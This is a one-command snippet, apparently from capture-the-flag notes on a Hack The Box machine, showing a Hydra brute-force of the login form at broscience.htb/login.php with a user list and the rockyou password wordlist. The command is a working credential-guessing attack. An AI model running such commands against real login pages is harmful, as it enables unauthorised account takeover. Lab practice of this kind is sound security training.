## HTTP Post Form
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt broscience.htb http-post-form '/login.php:username=^USER^&password=^PASS^:Username or password is incorrect.' -VFI -o hydra.txt
```